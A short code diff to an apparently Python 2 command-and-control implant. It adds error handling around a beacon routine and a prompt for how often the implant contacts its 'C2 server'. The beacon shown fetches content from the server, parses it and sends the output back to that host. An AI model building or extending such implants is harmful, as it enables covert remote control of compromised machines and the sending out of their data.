@@ -8,10 +8,13 @@ from optparse import OptionParser
 
 def beacon(host, seconds, proxies):
   time.sleep(int(seconds))
-  fetch, content = request(host, proxies)
-  if str(fetch) == "<Response [200]>":
-    output = parse(content, proxies)
-    send(host, output, proxies)
+  try:
+    fetch, content = request(host, proxies)
+    if str(fetch) == "<Response [200]>":
+      output = parse(content, proxies)
+      send(host, output, proxies)
+  except:
+    return 0
   
 def send(host, output, proxies):
   if proxies is not None:
@@ -109,6 +112,9 @@ def main():
 
   if opts.server is None:
     opts.server = raw_input("C2 server: ")
+
+  if opts.beacon is None:
+    opts.beacon = raw_input("How often should it beacon to C2 server: ")
 
   # Main Event Loop:
   try:
